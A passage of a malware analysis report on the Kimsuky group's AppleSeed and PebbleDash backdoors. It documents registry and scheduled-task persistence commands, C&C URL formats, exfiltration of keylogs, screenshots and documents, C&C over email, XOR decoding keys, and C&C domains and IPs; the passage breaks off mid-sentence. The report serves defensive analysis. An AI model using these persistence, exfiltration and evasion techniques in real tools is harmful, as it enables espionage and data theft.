HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n\nㄴ WindowsDefenderAutoUpdate\nㄴ regsvr32.exe /s \"C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll\"\n\nBesides the Run key, AppleSeed samples such as 4e58ea982e3e95fe7b1bdb480ab9810e may use the\nRunOnce key to maintain persistence.\n\n25\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n\n\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\n\nㄴ ESTsoftAutoUpdate\nㄴ regsvr32.exe /s \"C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll\"\n\nThe samples that employ the DLL hijacking method use the task scheduler to execute ALUpdate.exe\nprogram.\n\n\n\n- schtasks /create /sc minute /mo 10 /tn \"ESTSoft\\EST Software Auto Updater\" /tr C:\\Users\\[User\nName]\\AppData\\Roaming\\ESTsoft\\Common\\ESTUpdate.exe /f\n\n\n3.1.3. Privilege Escalation\n\nAt this stage, the malware checks if UAC is disabled in the current system. If the following registry keys\nall have 0 as their values, the sample will consider UAC to be disabled.\n\n\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\nㄴ ConsentPromptBehaviorAdmin\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\n\nㄴ PromptOnSecureDesktop\nWhen the UAC is disabled and the system does not have the administrator privilege, it executes its own\npath and regsvr32.exe as executed as administrator. Since UAC is already disabled, privilege escalation\nbecomes possible without the UAC pop-up. For the system that currently has admin privilege, the malware\nenables the SeDebugPrivilege privilege.\n\n3.1.4. Thread\n\nAppleSeed executes thPingCmd which works as the main thread. The thread simply executes two threads\nin the span of 60 seconds. The first thread is named sendHttpPing, which periodically communicates with\nthe C&C server to maintain connection. The second thread is named dropAndRunCmd and performs\nmalicious behaviors by receiving commands from the server.\n\nThe following table shows the URLs used by AppleSeed to communicate with the C&C server.\n\n**Mode** **URL** **Feature**\n\nping /?m=a&p1=[PcID]&p2=[PcInfo]- Maintaining connection with the\n\n[MalwareVersion] C&C server\n\nSending command /?m=b&p1=[PcID]&p2=a\n\nSending CMD command results\n\nresults\n\nDownloading /?m=c&p1=[PcID] Downloading commands from the\n\ncommands C&C server\n\nDownload complete /?m=d&p1=[PcID] Notifying completion of command\n\ndownload\n**Table 5. List of URLs used**\n\n\"m\" seems to mean \"mode,\" with \"a\" being used for \"ping\", \"b\" for \"commands\", \"c\" for \"downloading\ncommands\", and \"d\" for \"completing downloading commands\". These are all the URLs used in the sample,\n\n26\n\n|Mode|URL|Feature|\n|---|---|---|\n|ping|/?m=a&p1=[PcID]&p2=[PcInfo]- [MalwareVersion]|Maintaining connection with the C&C server|\n|Sending command results|/?m=b&p1=[PcID]&p2=a|Sending CMD command results|\n|Downloading commands|/?m=c&p1=[PcID]|Downloading commands from the C&C server|\n|Download complete|/?m=d&p1=[PcID]|Notifying completion of command download|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nbut more types of URLs are used for the sample with the info-stealing feature enabled, and they will be\ndiscussed later when the sample is analyzed.\n\n**a. sendHttpPing Thread**\nThe sendHttpPing thread is excuted every 60 seconds, sending the basic information of the infected\nsystem to the C&C server. Unlike other communication instances where only the PcID is sent, this thread\nalso sends PcInfo and the malware version like the URL shown below.\n\n/?m=a&p1=[PcID]&p2=[PcInfo]-[MalwareVersion]\n\nThe PcID used in this case combines the volume serial number and the user name such as \"888a15a5testUser.\" PcInfo is a bit more complicated. It is a string that appears to show the Windows version (Major,\nMinor, and Build) as well as the architecture and the malware version. The malware version is the string\n\"D_Regsvr32\" that was obtained during the decoding process for previous settings data and the string\nthat was decoded in the current thread 2.0 and 7.\n\n**Item** **Format** **Example**\n\nPcID [VolumeSerial]-[UserName] 888a15a5-testUser\n\nPcInfo Win[MajorVersion].[MinorVersion].[Build][Architecture] Win6.1.7601x86\n\nMalware [D_Regsvr32]-v[2.0].[7]\n\nD_Regsvr32-v2.0.7\n\nVersion\n\n**Table 6. Format used for sending information about infected system - HTTP**\n\n**Figure 29. Process of obtaining PcInfo**\n\n27\n\n|Item|Format|Example|\n|---|---|---|\n|PcID|[VolumeSerial]-[UserName]|888a15a5-testUser|\n|PcInfo|Win[MajorVersion].[MinorVersion].[Build][Architecture]|Win6.1.7601x86|\n|Malware Version|[D_Regsvr32]-v[2.0].[7]|D_Regsvr32-v2.0.7|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe information is ultimately sent to the C&C server with the following URL:\n\n/bear/?m=a&p1=888a15a5-testUser&p2=Win6.1.7601x86-D_Regsvr32-v2.0.7\n\n**b. dropAndRunCmd Thread**\nThis thread performs commands that it has received. After requesting the C&C server to send commands,\nit downloads and decrypts them to perform malicious behaviors, then sends back the result.\n\nIt accesses the C&C server using the URL \"/?m=c&p1=[PcID]\" and downloads the data that includes\ncommands. The User-Agent string used in the process is as follows:\n\n\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/74.0.3729.169 Safari/537.36\"\n\nThe downloaded data is saved as a file in the %ALLUSERSPROFILE%\\temp\\ path. Unlike average\nmalware strains, AppleSeed saves features that can be processed within the memory as a file. So for\nevery stage, such as downloading commands and unpacking and decrypting files, all the results are saved\nin the %ALLUSERSPROFILE%\\temp\\ path.\n\nWhen the download is finished, the malware accesses the C&C server via the URL \"/?m=d&p1=[PcID]\"\nto inform the server that the process has been completed. It is currently not possible to access the server,\nbut it appears that the downloaded data starts with the \"%PDF-1.7..4 0 obj\" signature. AppleSeed begins\nthe unpacking process after scanning the signature.\n\n**Figure 30. CRC scan for unpacked file**\n\nThe decryption process follows when the unpacking process is complete. The unpacked data includes\nthe RC4 key encrypted with the RSA public key and the data encrypted with the RC4 key. The malware\nfirst decrypts the data saved in the 0x80 size after +0x04 using the RSA (1024) private key included in the\nbinary and obtains the RC4 key based on the data. Then it decrypts the data with the RC4 key to have\nthe command data.\n\n28\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 31. Decrypted RSA (1024 bit) private key**\n\nWhile the command data is not available for download at this moment, it appears that the unpacked data\nwill have the following format based on the uploading process that will be discussed later in this report.\n\n**Offset** **Size** **Data**\n\n+0x00 0x04 Original size of the encrypted data\n\n+0x04 0x80 RC4 key encrypted with the RSA (1024 bit) public\n\nkey\n\n+0x84 Variable Command data encrypted with the RC4 key\n**Table 7. Encrypted command data received from C&C server**\n\nThe following table is a list of commands that the current analysis target, AppleSeed, can perform. The\ncommand names are based on the string confirmed through the debug message.\n\n**Command Number** **Command Name** **Description**\n\n0 CMD Performs command lines received\n\nfrom the C&C server and sends\n\nresults\n\n1 DLL Downloads DLL and executes it with\n\nthe RegSvr32.exe /s command\n\n2 MemDLL Downloads DLL and executes it in\n\nthe memory\n\n3 UpdateDLL Updates malware (same as the DLL\n\ncommand)\n**Table 8. C&C commands #1**\n\n29\n\n|Offset|Size|Data|\n|---|---|---|\n|+0x00|0x04|Original size of the encrypted data|\n|+0x04|0x80|RC4 key encrypted with the RSA (1024 bit) public key|\n|+0x84|Variable|Command data encrypted with the RC4 key|\n\n|Command Number|Command Name|Description|\n|---|---|---|\n|0|CMD|Performs command lines received from the C&C server and sends results|\n|1|DLL|Downloads DLL and executes it with the RegSvr32.exe /s command|\n|2|MemDLL|Downloads DLL and executes it in the memory|\n|3|UpdateDLL|Updates malware (same as the DLL command)|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nUnlike the MemDLL command that loads and executes malware within the memory, DLL and UpdateDLL\ncommand download DLL in the file form and execute it with the \"regsvr32.exe /s\" command. They are\ndivided into two commands (DLL, UpdateDLL) which are essentially the same.\n\nAs for the CMD command, it executes the command line that was sent and receives the result through a\npipe to save it in the %ALLUSERSPROFILE%\\temp\\ path. It then additionally encrypts the saved file\nbefore sending it like zip compression or the encryption process discussed above. The command first\ncreates a random RC4 key and encrypts the zip compression file with the RC4 algorithm. The randomly\ncreated RC4 key is encrypted with the public key included in the binary. The final data after the encoding\nprocess is as follows:\n\n**Offset** **Size** **Data**\n\n+0x00 0x04 Size of the zip file that will be\n\nencrypted\n\n+0x04 0x80 RC4 key encrypted with the RSA\n\n(1024 bit) public key\n\n+0x84 Variable Command data encrypted with the\n\nRC4 key\n**Table 9. Encrypted stolen information sent to C&C server**\n\n**Figure 32. RSA (1024 bit) public key used to encrypt attachment**\n\nThe compressed and encrypted data is attached to the POST request and sent as the following URL:\n\n/?m=b&p1=[PcID]&p2=a\n\n3.2. Analysis of Info-stealing Feature\n\nWhile the sample discussed earlier is a simple malware without the info-stealing feature, the same cannot\nbe said for other AppleSeed samples. Those with functional info-stealing feature can receive additional\ncommands from the C&C server and perform them. The following table provides an overview on the infostealing feature and routines for performing additional commands.\n\nAppleSeed samples with functional info-stealing feature use more URLs than those mentioned above.\n\n30\n\n|Offset|Size|Data|\n|---|---|---|\n|+0x00|0x04|Size of the zip file that will be encrypted|\n|+0x04|0x80|RC4 key encrypted with the RSA (1024 bit) public key|\n|+0x84|Variable|Command data encrypted with the RC4 key|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe following shows the entire URLs used with an explanation for each case.\n\n**Mode** **URL** **Feature**\n\nping /?m=a&p1=[PcID]&p2=[PcInfo]- Maintaining connection with the\n\n[MalwareVersion] C&C server\n\nSending /?m=b&p1=[PcID]&p2=a Sending CMD command results\ncommand results\n\n/?m=b&p1=[PcID]&p2=b Stealing designated file\n\n/?m=b&p1=[PcID]&p2=b Stealing document files from a\n\ncertain path\n\n/?m=b&p1=[PcID]&p2=b Stealing file list information within\n\nthe USB drive\n\n/?m=b&p1=[PcID]&p2=c Stealing captured screenshots\n\n/?m=b&p1=[PcID]&p2=d Stealing keylogging data\n\nDownloading /?m=c&p1=[PcID] Downloading commands from the\n\ncommands C&C server\n\nDownload /?m=d&p1=[PcID] Notifying completion of command\n\ncomplete download\n\n**Table 10. List of URLs used**\n\n3.2.1. Information Theft\n\nStarting from the installation, the sample proves that it's different by creating the flags folder and flag files\nbefore copying and running the file in the installation path. Each flag file contains a Unicode string \"flag.\"\nAt the info-stealing routine, the sample checks each flag and steals information from each existing flag.\nThe stolen data is then sent to the C&C server after being encrypted and compressed with zip.\n\n**Flag File** **Meaning**\n\nFolderMonitor Stealing document files\n\nKeyboardMonitor Keylogging\n\nScreenMonitor Taking screenshots\n\nUsbMonitor Stealing file list information of USB\n**Table 11. List of flag files**\n\n**Figure 33. Flag files within flags folder**\n\n31\n\n|Mode|URL|Feature|\n|---|---|---|\n|ping|/?m=a&p1=[PcID]&p2=[PcInfo]- [MalwareVersion]|Maintaining connection with the C&C server|\n|Sending command results|/?m=b&p1=[PcID]&p2=a|Sending CMD command results|\n||/?m=b&p1=[PcID]&p2=b|Stealing designated file|\n||/?m=b&p1=[PcID]&p2=b|Stealing document files from a certain path|\n||/?m=b&p1=[PcID]&p2=b|Stealing file list information within the USB drive|\n||/?m=b&p1=[PcID]&p2=c|Stealing captured screenshots|\n||/?m=b&p1=[PcID]&p2=d|Stealing keylogging data|\n|Downloading commands|/?m=c&p1=[PcID]|Downloading commands from the C&C server|\n|Download complete|/?m=d&p1=[PcID]|Notifying completion of command download|\n\n|Flag File|Meaning|\n|---|---|\n|FolderMonitor|Stealing document files|\n|KeyboardMonitor|Keylogging|\n|ScreenMonitor|Taking screenshots|\n|UsbMonitor|Stealing file list information of USB|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**a. Keylogging**\nThis is enabled if the KeyboardMonitor flag file exists within the flags folder. The keylogged data is saved\nas the log.text file within the cache folder in the installation path. It is compressed and encrypted along\nwith other stolen data and sent to the C&C server.\n\n**Figure 34. log.txt file that stores keylogging data**\n\n**b. Taking Screenshots**\nThis is enabled if the ScreenMonitor flag file exists within the flags folder. The malware takes a screenshot\nof the current screen and saves it in the %ALLUSERSPROFILE%\\temp\\ path as a jpg file. The file is sent\nto the C&C server after being compressed and encrypted.\n\n**Figure 35. Screenshot saved as jpg file**\n\n**c. Stealing Document Files**\nThis is enabled if the FolderMonitor flag file exists within the flags folder. The malware collects document\nfiles (e.g. \".txt,\" \".hwp,\" \".pdf,\" \".doc,\" \".xls,\" and \".ppt\") that exist within \"Desktop,\" \"Downloads,\"\n\"Documents,\" and \"%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\" folders, then sends them to\nthe C&C server after compressing and encrypting them.\n\n32\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 36. Routine for checking extensions of files that will be stolen**\n\n**d. Stealing File List of USB**\nThis is enabled if the UsbMonitor flag file exists within the flags folder. The malware finds a USB drive in\nthe current system and obtains the list of files within the USB via the following dir command. The obtained\ntext format data is also compressed and encrypted before being sent to the C&C server.\n\n\n\n- cmd /s dir [drive name]:\\ /s\n\n\n33\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 37. List of files within USB drive**\n\n3.2.2. Additional Commands\n\nSamples with the info-stealing feature enabled have 3 additional commands that can be performed after\nreceiving them from the C&C server. The commands are as follows:\n\n**Command Number** **Command Name** **Description**\n\nd Upload Setting target files to be stolen\n\ne EditFlag Enable or disable flag\n\nf FileDownload Saving files received in a certain\n\npath\n**Table 12. C&C commands #2**\n\n**a. Setting Target Files to be Stolen**\nBesides 4 monitor threads, AppleSeed has an additional thread that was not mentioned earlier. It\nperiodically reads the \"list.fdb\" file that exists in the installation path, and if the file contains the pathname\nof a certain file, it compresses and encrypts the file in the path to send it to the C&C server. The d command\nwrites the received pathname into the \"list.fdb\" file, and if the attacker wishes to steal a certain file, they\ncan send the file path through the d command to upload it to their server.\n\n34\n\n|Command Number|Command Name|Description|\n|---|---|---|\n|d|Upload|Setting target files to be stolen|\n|e|EditFlag|Enable or disable flag|\n|f|FileDownload|Saving files received in a certain path|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe URL used to upload files from the thread is the same as the one that is used to steal document files\nand USB drive file list as shown below.\n\n/?m=b&p1=[PcID]&p2=b\n\n**b. Setting Flags**\nWhen the sample is initially installed, it enables 4 flags: FolderMonitor, KeyboardMonitor, ScreenMonitor,\nand UsbMonitor. The e command enables or disables each flag depending on the received data. When\nenabling, a file with the same name is created for each flag, and when disabling, the files are deleted.\n\n**c. Downloading Files**\nA command for downloading files to create the received data in a certain path.\n\n3.3. C&C Communication Using Emails\n\nIn terms of overall features, AppleSeed samples that use email for C&C communications are not much\ndifferent from the sample discussed in the \"3.1 Analysis of Default Features\" in this report. However, one\ndifference is that the samples use email protocols instead of HTTP during the C&C communications\nprocess. As such, the C&C communications via emails will be analyzed in detail.\n\nLike the sample with default features from the \"3.1.4. Thread\" part, AppleSeed utilizing email creates 2\nmain threads. They can be categorized as Ping thread and Command thread respectively, using email\nprotocol to communicate with the C&C server. The email address and password of the attacker are\nencoded and saved within the file.\n\n**Email Address** **Password**\n\nk1-tome@daum[.]net c$#****fzF - (Certain strings blurred as ****)\n**Table 13. Information of attacker's email**\n\nThe attacker used the curl open source[2] to communicate with the C&C server using an email. The 2 main\nthreads created by the Email AppleSeed sample can be divided into a thread that uses the IMAP protocol\nand a thread that uses the SMTP protocol based on their roles. The Ping thread defined in the \"3.1.\n\"Analysis of Default Features\" part uses the SMTP protocol as its role is to send the information of the\ncurrent system to the attacker's email. The Command thread uses the IMAP protocol since it receives\nadditional malicious data from the attacker's email.\n\n**Protocol Server** **Related Thread**\n\nsmtps://smtp.daum[.]net:465 Ping Thread\n\nimaps://imap.daum[.]net:993 Command Thread\n**Table 14. Protocol usage type for each thread**\n\n2 [https://github.com/curl/curl](https://github.com/curl/curl)\n\n35\n\n|Email Address|Password|\n|---|---|\n|k1-tome@daum[.]net|c$#****fzF - (Certain strings blurred as ****)|\n\n|Protocol Server|Related Thread|\n|---|---|\n|smtps://smtp.daum[.]net:465|Ping Thread|\n|imaps://imap.daum[.]net:993|Command Thread|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n3.3.1. Ping Thread (SMTP)\n\nThe sendHttpPing thread operates every 5 minutes. While it operates, it periodically sends the basic\ninformation of the infected system to the attacker's email. The name of the email sent to the attacker takes\nthe form of \"history yyyy-mm-dd_hh-mm-ss-sss.\" Note that the results shown below are based on a test\naccount and not the actual address used by the attacker.\n\n**Figure 38. Title of email sent from Ping thread**\n\n**Figure 39. Content of email sent from Ping thread (test account used)**\n\n**Item** **Format**\n\nTime [yyyy-mm-dd_hh-mm-ss-sss]\n\nVolume Serial Number [VolumeSerialNumber]\n\nPcInfo Win[MajorVersion].[MinorVersion].[Build][Architecture]\n\nMalware Version [D_Regsvr32]\\nnv[2.0]\\nn[7]\n**Table 15. Format used for sending information about the infected system - Email**\n\n3.3.2. Command Thread (IMAP)\n\nThis thread is executed every 30 seconds. It checks if there is an email mailbox named \"cmd\" in the\nattacker's email account and downloads additional malware through the email's attachments. As the\nattacker's email account cannot currently be accessed, it is not certain what types of malicious files exist.\n\"5. Post Infection\" section of this report will discuss additionally installed malware strains identified by\nAhnLab ASD infrastructure.\n\n36\n\n|Item|Format|\n|---|---|\n|Time|[yyyy-mm-dd_hh-mm-ss-sss]|\n|Volume Serial Number|[VolumeSerialNumber]|\n|PcInfo|Win[MajorVersion].[MinorVersion].[Build][Architecture]|\n|Malware Version|[D_Regsvr32]\\nnv[2.0]\\nn[7]|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 40. 'cmd' mailbox used for distributing additional malware (cmd mailbox created for**\n\n**test purpose)**\n\nThe attacker uses the IMAP feature of the curl open source to download additional malware from the email\nserver. After going through the IMAP reset process, the thread sends the \"select cmd\" command to check\nif the mailbox named \"cmd\" exists.\n\n**Figure 41. Transmission code for IMAP command that checks cmd mailbox**\n\nIf the mailbox named \"cmd\" exists, the thread saves the attached file in\nthe %ALLUSERSPROFILE%\\temp path with the name [random 4 characters].tmp after going through the\nparsing process.\n\n37\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 42. Receiving email with attached file**\n\nAfter saving the attached file in the %ALLUSERSPROFILE%\\temp path, the sample uses the \"STORE 1\n+Flags \\Deleted\" command to delete the email with the attached file from the mailbox. The process for\nunpacking and decrypting the file is the same as the content of the dropAndRunCmd thread explained in\n\"3.1 Analysis of Default Features.\" This means that the sample can perform 4 commands: CMD, DLL,\nMemDLL, and UpdateDLL.\n\n4. Analysis of PebbleDash\n\nPebbleDash, first found in 2016, is a backdoor malware that is known to be used by Lazarus group.\nPebbleDash is similar to malware strains of NukeSped backdoor used by Lazarus. However, since it was\ndubbed as PebbleDash in CISA (U.S. Cybersecurity & Infrastructure Security Agency) analysis report, this\nreport will also refer it as PebbleDash.[3]\n\nMost PebbleDash types need a certain argument upon being executed, but there is also a DLL form that\nis executed after being injected by other malware. Upon being executed for the first time, the malware\ndecrypts the encrypted argument strings used for verification and the list of API functions that it will use.\nAs for its own encrypted settings data, it uses another algorithm to decrypt it.\n\nIn addition, it disguises itself as a TLS protocol to communicate with the C&C server and bypasses network\ndetection by using multiple normal URLs and random data. It only supports basic features, such as\nstealing basic information and performing commands, and is not equipped with features that backdoors\npossess (e.g. taking screenshots, keylogging). However, it has a unique feature of re-enabling itself from\nthe disabled state to perform malicious behavior at the occurrence of events such as the system being\nadded with a USB drive or another user logging in through RDP.\n\n3 [https://us-cert.cisa.gov/ncas/analysis-reports/ar20-133c](https://us-cert.cisa.gov/ncas/analysis-reports/ar20-133c)\n\n38\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nDistributed PebbleDash samples have some common characteristics: they require arguments to be\nexecuted normally, have encrypted settings data, and have commands they support in common. Note\nthat there are differences between them, and one key difference is that the recent samples use HTTP\nprotocol (WinHTTP) unlike previous ones that used Raw Socket to communicate with C&C. Also, while\ninitial samples did not have features for maintaining persistence, current ones are added with the behavior\nfor registering the registry Run key, which allows them to be operated after reboot. PebbleDash samples\nnowadays are created through the PIF dropper, but in the system already infected with malware such as\nAppleSeed or PebbleDash, there are also cases of the malware having being downloaded from a certain\nURL.\n\nMalware strains recently used by the Kimsuky group are all DLLs designed to execute via regsvr32.exe.\nIn the latest version of PebbleDash, a command used to execute additional payloads through\nregsvr32.exe was added. It is noteworthy that the different C&C domains used by the PebbleDash sample\n(created by PIF dropper) and the Kimsuky group's AppleSeed sample were confirmed to share the same\nIP address.\n\n**C&C IP** **Sample** **C&C Domain**\n\nwww.onedriver.kro[.]kr\nPebbleDash\nnews.scienceon.r-e[.]kr\n\n45.124.66[.]28\n\nAppleSeed you.ilove.n-e[.]kr\n\nPIF get.seino.p-e[.]kr\n\nPebbleDash movie.youtoboo.kro[.]kr\n\nppahjcz.tigerwood[.]tech\n\n216.189.149[.]78 ping.requests.p-e[.]kr\n\nAppleSeed\n\ninterface.avg.n-e[.]kr\ndriver.spooler.p-e[.]kr\n\n**Table 16. Comparing C&C information of PebbleDash and AppleSeed**\n\nBelow is the analysis information of initial and latest versions of PebbleDash and the comparison between\nthe two samples.\n\n4.1. Analysis of Initial PebbleDash\n\n4.1.1. Initial Routine\n\nAs initial versions of PebbleDash check for arguments and terminate themselves if there is no match, they\nuse the anti-sandbox technique that does not perform any behaviors if they are terminated. The following\nis the argument string that the current analysis target sample compares to.\n\n**- Argument String Needed for Execution: 48Ur~@3$1h45dGy**\n\n**a. Routine for Decoding Argument and Settings Data**\n\n39\n\n|C&C IP|Sample|C&C Domain|\n|---|---|---|\n|45.124.66[.]28|PebbleDash|www.onedriver.kro[.]kr news.scienceon.r-e[.]kr|\n||AppleSeed|you.ilove.n-e[.]kr|\n||PIF|get.seino.p-e[.]kr|\n|216.189.149[.]78|PebbleDash|movie.youtoboo.kro[.]kr|\n||AppleSeed|ppahjcz.tigerwood[.]tech ping.requests.p-e[.]kr interface.avg.n-e[.]kr driver.spooler.p-e[.]kr|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe string shown above exists in the binary in the Xor encoded form. PebbleDash uses two types of\ndecoding routines: A routine of decoding arguments and settings data, and a routine of decoding the API\nlist. Both are done in the 0x1 byte Xor method, but the algorithm and key data are different.\n\nThis report will first discuss the routine used to decode settings data that includes the argument value.\nThe followings are the 0x40 byte-sized Xor key and decoding routine.\n\n\n\n**- Xor Key used to Decode Settings: 5E 85 41 FD 0C 37 57 71 D5 51 5D E3 B5 55 62 20 C1 30 96**\nD3 77 4C 23 13 84 8B 63 5C 48 32 2C 5B 94 8F 3A 26 79 E2 6B 94 45 D1 6F 51 24 8F 86 72 C8 D3\n8D C1 C0 D3 88 56 84 B3 91 E2 B2 24 64 24\n\n\n\n**- Xor Decoding Algorithm: EncDatan xor XorKeyn+SizeOfEncData-8%0x40 xor 0x59**\n\n\n**Figure 43. Xor decoding routine used to restore arguments and settings data**\n\nThe data is decoded using simple encoded data, 0x59, and the Xor key. The Xor key is 0x40 byte, and\nthe 0x01 byte key value that is used is the -0x08 offset of the encoded data size.\n\n**- Example**\n**Encoded String: B8 30 51 C8 92 4C 08 5D A9 01 FB BF 4A 52 03 4A**\n**Decoded String: 34 38 55 72 7E 40 33 24 31 68 34 35 64 47 79 00 ( 48Ur~@3$1h45dGy )**\n\n**b. Routine for Decrypting API Function List**\nBesides settings data, PebbleDash has an encrypted list of API functions that it uses after the decryption\nand API Resolving process. The list of API functions is encrypted in the data section. Decrypting the entire\n0x0829 size allows you to obtain the list for the entire API. The list also uses the 0x01 byte Xor method,\nbased on the 0x10-sized Xor key data shown below.\n\n**- Xor Key Data Used for API List Decryption: 81 16 AA 52 36 F2 03 3F 6D E2 48 41 49 6A 7E 67**\n\nThe Xor method uses the +0x01 offset, meaning that 0x16 to 0x01 bytes based on the key shown above\nare used as an Xor key.\n\n**- Xor Decryption Algorithm: EncDatan xor XorKeyn+1**\n\nWhen 1 key is used, the new 0x01 byte Xor key is created based on the 0x10 byte-sized Xor key data\nusing the following algorithm.\n\n40\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**- Key Creation Algorithm: ( key0x00 + key0x09 ) xor key0x0d xor key0x0f = NewXorKey**\n\nFor instance, the Xor key that is first created becomes 0x6E by adding each offset's 0x01 byte value and\ngoing through the Xor operation. Using such a method, the algorithm creates a new 0x01 byte key each\ntime.\n\n\n\n**- Example: (0x81 + 0xE2 ) xor 0x6A xor 0x67 = 0x6E**\n\n\n\n**- New Xor Key Data: 16 AA 52 36 F2 03 3F 6D E2 48 41 49 6A 7E 67 6E**\n\n\n**Figure 44. Xor decryption routine used for restoring API list**\n\n\n41\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 45. List of API names that are decrypted**\n\n4.1.2. Recovering Settings Data\n\nSettings data is encoded with 0x01 byte Xor in the same method for argument strings discussed above.\nPebbleDash can have 5 C&C server URLs and randomly choose 1 among them to communicate. The\ncurrent analysis target sample only has 1 URL. The settings data is shown below.\n\n42\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 46. Decrypted settings data**\n\nTable 17 shows the structure of the settings data. Up to 5 C&C URL data from 0x00 to 0x10 byte sizes\ncan be included.\n\n**Offset** **Size** **Meaning**\n\n+0x00 0x02 sockaddr_in.sin_family\n\n+0x02 0x02 sockaddr_in.sin_port\n\n+0x04 0x04 sockaddr_in.sin_addr\n\n+0x08 0x08 NULL\n\n... ... ...\n\n+0x50 0x08 Next C&C\ncommunications time\n\n+0x58 0x04 Default Sleep count\n\n+0x5C 0x04 Random value\n\n+0x60 0x04 Drive notification flag\n\n+0x64 0x04 Session notification flag\n**Table 17. Settings data**\n\nThe PebbleDash sample discussed here uses Raw Socket to communicate with the C&C server. Upon\nexamining the decrypted settings data, the C&C URL is shown as \"41.92.208[.]195:443\".\n\n43\n\n|Offset|Size|Meaning|\n|---|---|---|\n|+0x00|0x02|sockaddr_in.sin_family|\n|+0x02|0x02|sockaddr_in.sin_port|\n|+0x04|0x04|sockaddr_in.sin_addr|\n|+0x08|0x08|NULL|\n|...|...|...|\n|+0x50|0x08|Next C&C communications time|\n|+0x58|0x04|Default Sleep count|\n|+0x5C|0x04|Random value|\n|+0x60|0x04|Drive notification flag|\n|+0x64|0x04|Session notification flag|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nUnlike other backdoors, PebbleDash does not have multiple communications with the C&C server during\na short period, waiting at least 60 seconds before performing a command. The settings data for the +0x58\noffset means the setting for the Sleep() time for waiting. As the sample above has a value of 0x0A (10), it\nwill wait for 600 seconds. The default Sleep time can be modified by the C&C command.\n\nThe settings data for the +0x50 offset indicates the next time the communication starts with the C&C\nserver. It currently has NULL, but it can be modified by receiving commands. This means that the malware\ncan receive commands from the C&C server to communicate several hours later. The settings data for\nthe +0x5C offset is the 0x4 byte random data that was found earlier. As it is used to communicate with the\nC&C server, it is presumably used as a unique identifier.\n\nSince PebbleDash waits for a long time to communicate with the C&C server by default, it is difficult for\nthe malware to respond to changes in the infected system in real-time. Given the fact, the developer has\nadded a feature which ends the waiting routine and enables communication with the C&C server when a\nnew drive or session is created to prevent the malware from waiting for an indefinite period of time. The\nfeature is enabled when the drive notification flag and session notification flag mentioned earlier are set.\n\n**Figure 47. Routine for drive and session notifications**\n\nThe routine first uses the GetLogicalDrives() API to find the number of drives that are currently available\nand periodically checks the change in quantity. When a new drive is added, it is most likely that a USB\nmemory has been inserted. The routine also uses the WTSEnumerateSessionsW() API to monitor the\nnumber of currently enabled sessions. If another user logs on to the infected system or accesses remotely\nthrough RDP, the number of sessions will increase, enabling PebbleDash.\n\n44\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nPebbleDash also has a command that sends various information of the infected system to the C&C server,\nand this will be mentioned later in this report. Among data that is sent, there is the status data. As seen\nbelow, it gains a different value when the malware is performing commands or when a drive/session is\nadded. Such status value will be meaningful only when it is sent to the C&C server in real time. So while\nwe cannot precisely know how the C&C server is configured, it appears that the command is used for\nbasic communications instead of the attacker manually sending it.\n\n**Status Data** **Meaning**\n\n0x00 Initial Value\n\n0x01 Performing waiting routine\n\n0x02 Performing command routine (in units of\n\n5)\n\n0x03 When a drive is added (usually when\n\nUSB is inserted)\n\n0x04 When a session is added (usually\n\nlogging in through local or RDP)\n**Table 18. Types of status data**\n\n4.1.3. C&C Communications\n\nPebbleDash communicates with the C&C server by disguising itself as TLS communications. For instance,\nthe following is the packet initially sent to the C&C server.\n\n**Figure 48. Initial packet sent to C&C server**\n\nThe packet is the Client Hello request of the TLS Handshake process and has the following structure.\n\n45\n\n|Status Data|Meaning|\n|---|---|\n|0x00|Initial Value|\n|0x01|Performing waiting routine|\n|0x02|Performing command routine (in units of 5)|\n|0x03|When a drive is added (usually when USB is inserted)|\n|0x04|When a session is added (usually logging in through local or RDP)|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 49. TLS Client 